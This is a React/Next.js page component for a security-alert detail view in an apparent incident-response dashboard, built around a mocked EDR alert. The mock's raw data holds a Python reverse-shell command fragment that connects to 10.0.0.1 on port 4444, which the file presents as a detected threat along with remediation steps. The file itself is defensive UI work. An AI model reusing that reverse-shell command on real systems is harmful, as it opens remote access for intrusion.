'use client'

import { useState } from 'react'
import Link from 'next/link'

interface Alert {
  id: string
  source: string
  source_alert_id: string
  title: string
  description: string
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
  status: 'NEW' | 'INVESTIGATING' | 'RESOLVED' | 'FALSE_POSITIVE'
  detected_at: string
  created_at: string
  raw_data: string
  related_incidents: Array<{
    id: string
    title: string
    status: string
  }>
  llm_analysis?: {
    summary: string
    severity_reason: string
    recommended_actions: string[]
    similar_alerts: Array<{
      id: string
      title: string
      similarity: number
    }>
  }
}

const mockAlert: Alert = {
  id: '1',
  source: 'CrowdStrike EDR',
  source_alert_id: 'EDR-2024-001',
  title: 'Suspicious Process Execution',
  description: 'Detected suspicious process execution with potential malicious behavior on host ABC-123.',
  severity: 'HIGH',
  status: 'NEW',
  detected_at: '2024-02-16T10:05:00Z',
  created_at: '2024-02-16T10:05:30Z',
  raw_data: `{
    "hostname": "ABC-123",
    "process": "/usr/bin/python3",
    "commandline": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444))'",
    "user": "john.doe",
    "pid": 12345
  }`,
  related_incidents: [
    {
      id: '1',
      title: 'Suspicious Login Attempts',
      status: 'NEW',
    },
  ],
  llm_analysis: {
    summary: 'This alert indicates a potential reverse shell attempt using Python. The command line parameters show code that establishes a network connection, which is commonly used in post-exploitation scenarios.',
    severity_reason: 'The severity is HIGH because the observed behavior matches known malicious patterns and could indicate system compromise.',
    recommended_actions: [
      'Isolate the affected host (ABC-123) immediately',
      'Investigate other activities from the user john.doe',
      'Check network logs for connections to 10.0.0.1:4444',
      'Scan the system for additional malware or backdoors',
    ],
    similar_alerts: [
      {
        id: '2',
        title: 'Reverse Shell Detection on DEF-456',
        similarity: 0.92,
      },
    ],
  },
}

const SeverityBadge = ({ severity }: { severity: string }) => {
  const colorClass = {
    LOW: 'bg-gray-100 text-gray-800',
    MEDIUM: 'bg-yellow-100 text-yellow-800',
    HIGH: 'bg-orange-100 text-orange-800',
    CRITICAL: 'bg-red-100 text-red-800',
  }[severity] || 'bg-gray-100 text-gray-800'

  return (
    <span className={`px-2 py-1 rounded-full text-xs font-medium ${colorClass}`}>
      {severity}
    </span>
  )
}

const StatusBadge = ({ status }: { status: string }) => {
  const colorClass = {
    NEW: 'bg-blue-100 text-blue-800',
    INVESTIGATING: 'bg-yellow-100 text-yellow-800',
    RESOLVED: 'bg-green-100 text-green-800',
    FALSE_POSITIVE: 'bg-gray-100 text-gray-800',
  }[status] || 'bg-gray-100 text-gray-800'

  return (
    <span className={`px-2 py-1 rounded-full text-xs font-medium ${colorClass}`}>
      {status}
    </span>
  )
}

export default function AlertDetail() {
  const [showRawData, setShowRawData] = useState(false)
  const alert = mockAlert // 実際のAPIでは、params.idを使用して取得

  const handleCreateIncident = () => {
    // TODO: インシデント作成APIの呼び出し
  }

  const handleStatusChange = (newStatus: Alert['status']) => {
    // TODO: ステータス更新APIの呼び出し
    console.log(newStatus)
  }

  return (
    <div className="container mx-auto max-w-6xl py-8 px-4">
      <div className="space-y-6">
        <div className="flex justify-between items-start">
          <div className="space-y-2">
            <h1 className="text-2xl font-bold">{alert.title}</h1>
            <div className="flex gap-2 items-center">
              <SeverityBadge severity={alert.severity} />
              <StatusBadge status={alert.status} />
              <span className="text-sm text-gray-500">
                Source: {alert.source}
              </span>
              <span className="text-sm text-gray-500">
                ID: {alert.source_alert_id}
              </span>
            </div>
          </div>
          <div className="flex gap-2">
            <button
              onClick={handleCreateIncident}
              className="px-4 py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 flex items-center gap-2"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              Create Incident
            </button>
            <div className="relative">
              <button
                className="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-gray-500"
              >
                Change Status
              </button>
              <div className="absolute right-0 mt-2 w-48 bg-white dark:bg-gray-800 rounded-lg shadow-lg border border-gray-200 dark:border-gray-700 hidden">
                {['NEW', 'INVESTIGATING', 'RESOLVED', 'FALSE_POSITIVE'].map((status) => (
                  <button
                    key={status}
                    onClick={() => handleStatusChange(status as Alert['status'])}
                    className="w-full px-4 py-2 text-left hover:bg-gray-100 dark:hover:bg-gray-700 first:rounded-t-lg last:rounded-b-lg"
                  >
                    {status}
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-6">
            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-sm">
              <h2 className="text-lg font-semibold mb-4">Alert Details</h2>
              <div className="space-y-4">
                <div>
                  <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Description</h3>
                  <p className="mt-1">{alert.description}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Detection Time</h3>
                  <p className="mt-1">{new Date(alert.detected_at).toLocaleString()}</p>
                </div>
                <div>
                  <div className="flex justify-between items-center mb-2">
                    <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Raw Data</h3>
                    <button
                      onClick={() => setShowRawData(!showRawData)}
                      className="text-sm text-blue-500 hover:text-blue-600"
                    >
                      {showRawData ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  {showRawData && (
                    <pre className="mt-1 p-4 bg-gray-50 dark:bg-gray-900 rounded-lg overflow-x-auto text-sm font-mono">
                      {alert.raw_data}
                    </pre>
                  )}
                </div>
              </div>
            </div>

            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-sm">
              <h2 className="text-lg font-semibold mb-4">Related Incidents</h2>
              {alert.related_incidents.length > 0 ? (
                <div className="space-y-4">
                  {alert.related_incidents.map((incident) => (
                    <Link
                      key={incident.id}
                      href={`/incidents/${incident.id}`}
                      className="block p-4 bg-gray-50 dark:bg-gray-700 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-600 transition-colors"
                    >
                      <div className="flex justify-between items-center">
                        <div>
                          <h3 className="font-medium">{incident.title}</h3>
                          <p className="text-sm text-gray-500 dark:text-gray-400">
                            ID: {incident.id}
                          </p>
                        </div>
                        <StatusBadge status={incident.status} />
                      </div>
                    </Link>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 dark:text-gray-400">
                  No related incidents found.
                </p>
              )}
            </div>
          </div>

          <div className="space-y-6">
            {alert.llm_analysis && (
              <>
                <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-sm">
                  <h2 className="text-lg font-semibold mb-4">LLM Analysis</h2>
                  <div className="space-y-4">
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Summary</h3>
                      <p className="mt-1">{alert.llm_analysis.summary}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Severity Reasoning</h3>
                      <p className="mt-1">{alert.llm_analysis.severity_reason}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 dark:text-gray-400">Recommended Actions</h3>
                      <ul className="mt-1 space-y-2">
                        {alert.llm_analysis.recommended_actions.map((action, index) => (
                          <li key={index} className="flex items-start gap-2">
                            <span className="text-blue-500">•</span>
                            <span>{action}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-sm">
                  <h2 className="text-lg font-semibold mb-4">Similar Alerts</h2>
                  <div className="space-y-4">
                    {alert.llm_analysis.similar_alerts.map((similar) => (
                      <Link
                        key={similar.id}
                        href={`/alerts/${similar.id}`}
                        className="block p-4 bg-gray-50 dark:bg-gray-700 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-600 transition-colors"
                      >
                        <div className="flex justify-between items-center">
                          <div>
                            <h3 className="font-medium">{similar.title}</h3>
                            <p className="text-sm text-gray-500 dark:text-gray-400">
                              Similarity: {(similar.similarity * 100).toFixed(1)}%
                            </p>
                          </div>
                          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                      </Link>
                    ))}
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  )
} 